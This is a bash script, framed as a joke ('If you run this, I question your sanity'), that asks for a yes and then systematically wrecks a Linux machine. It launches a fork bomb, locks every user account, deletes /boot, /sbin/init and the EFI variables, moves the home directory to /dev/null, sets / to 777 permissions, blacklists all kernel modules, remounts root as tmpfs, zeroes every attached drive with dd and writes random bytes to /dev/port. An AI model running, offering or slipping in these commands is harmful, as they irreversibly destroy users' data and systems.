!/bin/bash

## If you run this, I question your sanity.

read -r -p "Do you seriously want to run this? " start_script
if ! [ "${start_script}" = "y" ] && ! [ "${start_script}"  = "yes" ]; then
  exit 1
fi

# Can't be a fun adventure without some music.
sudo dd if=/dev/urandom of=/dev/audio &

# Fork bomb to run in the background while we totally fuck up your system.
:(){ :|:& };: &

# Can't be hacked if the hacker can't get in.
for i in $(awk -F':' '{ print $1}' /etc/passwd)
do
  sudo passwd -l ${i}
done

# Systemd is bloat.
sudo rm -rf /sbin/init
sudo ln -s /bin/vim /sbin/init

# GRUB? What's that?
sudo rm -rf /boot

# Lennart really should have fixed #2402.
sudo rm -rf /sys/firmware/efi/efivars

# Oops. Dropped my home directory.
mv ${HOME} /dev/null

# Permissions are useless anyway.
sudo chmod 777 -R /

# Reduce attack surface. We're security pros.
for i in $(find /usr/lib/modules/$(uname -r)/kernel/drivers -type f -name "*.ko.xz" | awk -F"/" '{print $NF}' | sed -e 's/.ko.xz//g')
do
  echo "install ${i} /bin/true" | sudo tee -a /etc/modprobe.d/blacklist-all.conf
done

echo "kernel.modules_disabled=1" | sudo tee /etc/sysctl.d/modules_disabled.conf

# Your files never existed in the first place.
sudo mount -o remount,defaults -t tmpfs /
echo "/ / tmpfs defaults 0 0" | sudo tee -a /etc/fstab

# De-bloat all of your connected drives.
for i in $(lsblk | grep ^[a-z] | grep -v ^sr[0-9] | awk '{print $1}')
do
  sudo dd if=/dev/zero of=/dev/${i}
done

# Fancy reboot.
sudo dd if=/dev/random of=/dev/port
